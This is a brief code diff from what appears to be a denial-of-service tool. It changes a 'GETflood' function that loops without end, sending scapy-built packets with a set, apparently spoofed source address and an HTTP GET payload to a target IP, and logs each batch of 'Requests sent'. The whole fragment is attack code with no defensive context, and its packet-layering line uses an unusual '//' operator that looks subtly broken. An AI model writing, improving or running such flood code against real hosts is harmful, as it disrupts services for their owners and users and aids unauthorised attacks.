@@ -95,7 +95,7 @@ def GETflood(tgtIP):
         logging.info(" Attacking {}...".format(tgtIP))
         time.sleep(0.5)
         while True:
-            send(IP(src=srcIP, dst=tgtIP)/TCP()//b"GET / HTTP/1.0\r\n\r\n")
+            send(IP(src=srcIP, dst=tgtIP)/TCP()//b"GET / HTTP/1.1\r\n\r\n")
             logging.info("{0}[{1}{2}{0}] {3}Requests sent{0}".format(RST, DGREY, count, RD))
             count += 1
     except KeyboardInterrupt:
